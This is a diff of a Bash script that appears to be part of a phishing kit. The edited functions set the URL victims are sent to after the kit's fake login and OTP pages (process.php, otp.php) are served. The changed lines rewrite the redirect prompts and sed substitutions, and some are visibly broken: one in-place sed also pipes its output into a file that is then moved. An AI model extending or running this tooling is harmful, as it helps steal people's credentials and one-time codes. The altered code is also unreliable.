@@ -1,4 +1,4 @@
-##COLOUR VARIABLES
+##COLOUR VARIABLE
 
 #Text
 RED="$(printf '\033[31m')"
@@ -583,22 +583,22 @@ setup_site() {
 ## Redirect
 redirect_check(){
      echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Current Redirect Url : ${rdurl} "   
+     echo "\n"
      read -p "${RED}[${WHITE}?${RED}]${BLUE} Do you want to change redirect URL (Y/n) : ${BLUE}"
 		case $REPLY in
                 Y | y)
   	                redirect_input;;
                 N | n | *)
                         echo ""
-                        redirect_setup;;
-
-	        esac;;
+                        redirect_default;;
+	        esac
 }
 redirect_input() {
         read -p "${RED}[${WHITE}?${RED}]${YELLOW} Your Redirect URL : ${BLUE}" urdurl
         if [[ ! "${urdurl//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
 		if [[  "${urdurl::3}" != 'www' ]]; then
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error : Invalid URL | USE www/http/https insted of : ${ururl}"
-			{ sleep 1.5; clear; banner; redirect_setup; }
+			{ sleep 1.5; clear; banner; redirect_input; }
 		fi
         else
                 redirect_setup
@@ -606,34 +606,31 @@ redirect_input() {
 }
 redirect_setup() {
 	if [ -f ${www_dir}/NOTP ];then
-                sed 's/redirecturl/${urdurl}/g' ${www_dir}/process.php > process.php
+                sed -i "" "s/redirecturl/${urdurl}/g" "${www_dir}/process.php" > process.php
                 rm -rf ${www_dir}/process.php
-                mv process.php ${www_dir}/
-        elif [ -f ${www_dir}/OOTP || -f ${www_dir}/POTP ];then
-                sed 's/redirecturl/${urdurl}/g' ${www_dir}/otp.php > otp.php
+                mv process.php ${www_dir}
+        elif [[ -f ${www_dir}/OOTP || -f ${www_dir}/POTP ]];then
+                sed -i "" "s/redirecturl/${urdurl}/g" "${www_dir}/otp.php" > otp.php
                 rm -rf ${www_dir}/otp.php
-                mv otp.php ${www_dir}/
+                mv otp.php ${www_dir}
 	else
-		echo " ${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up custom redirect URL!!"
+		echo "${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up custom redirect URL!!"
                 echo -ne "\n${RED}[${WHITE}?${RED}]${GREEN} Setting up default redirect URL"
                 echo -ne "${RED}[${WHITE}?${RED}]${GREEN} Redirect URL : ${BLUE} ${rdurl}"
                 sleep 3
                 redirect_default
-        fi    
+        fi
 }
 redirect_default() {
 	if [ -f ${www_dir}/NOTP ];then
-                sed 's/redirecturl/${rdurl}/g' ${www_dir}/process.php > process.php
+                sed -i "" "s/redirecturl/${rdurl}/g" "${www_dir}/process.php" > process.php
                 rm -rf ${www_dir}/process.php
                 mv process.php ${www_dir}/
-        elif [ -f ${www_dir}/OOTP || -f ${www_dir}/POTP ];then
-                sed 's/redirecturl/${rdurl}/g' ${www_dir}/otp.php > otp.php
-                rm -rf ${www_dir}/otp.php
-                mv otp.php ${www_dir}/
+        elif [[ -f ${www_dir}/OOTP || -f ${www_dir}/POTP ]];then
+                sed -i "s/redirecturl/${rdurl}/" "${www_dir}/otp.php"
 	else
 		echo " ${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up custom redirect URL!!"
-                
-        fi    
+        fi
 }
 
 #Check whether link was generated properly
